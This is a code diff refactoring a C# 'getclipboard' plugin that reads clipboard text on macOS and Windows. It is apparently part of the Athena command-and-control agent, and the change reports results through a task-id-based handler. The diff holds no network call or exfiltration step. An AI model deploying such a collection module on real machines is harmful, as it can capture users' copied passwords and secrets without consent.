@@ -1,17 +1,16 @@
+﻿using PluginBase;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
-using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 
-namespace Athena
+namespace Plugin
 {
-    public static class Plugin
+    public static class getclipboard
     {
-        public static PluginResponse Execute(Dictionary<string, object> args)
+        public static void Execute(Dictionary<string, object> args)
         {
             //I can either include this all in one (easier but larger plugin size)
             //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
@@ -19,44 +18,31 @@ namespace Athena
             {
                 if (OperatingSystem.IsMacOS())
                 {
-                    return new PluginResponse()
-                    {
-                        success = true,
-                        output = OsxClipboard.GetText()
-                    };
+                    PluginHandler.Write(OsxClipboard.GetText(), (string)args["task-id"], true);
                 }
                 else if (OperatingSystem.IsWindows())
                 {
-                    return new PluginResponse()
-                    {
-                        success = true,
-                        output = WindowsClipboard.GetText()
-                    };
-                }
-                else if (OperatingSystem.IsLinux())
-                {
-                    return new PluginResponse()
-                    {
-                        success = false,
-                        output = "Not implemented on this OS yet."
-                    };
+                    PluginHandler.Write(WindowsClipboard.GetText(), (string)args["task-id"], true);
                 }
                 else
                 {
-                    return new PluginResponse()
-                    {
-                        success = false,
-                        output = "Not implemented on this OS yet."
-                    };
+                    PluginHandler.Write("Not implemented on this OS yet.", (string)args["task-id"], true, "error");
                 }
+                //else
+                //{
+                //    return new ResponseResult
+                //    {
+                //        completed = "true",
+                //        user_output = "Not implemented on this OS yet.",
+                //        task_id = (string)args["task-id"],
+                //        status = "error"
+                //    };
+                //}
             }
             catch (Exception e)
             {
-                return new PluginResponse()
-                {
-                    success = false,
-                    output = e.Message
-                };
+                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                return;
             }
         }
 
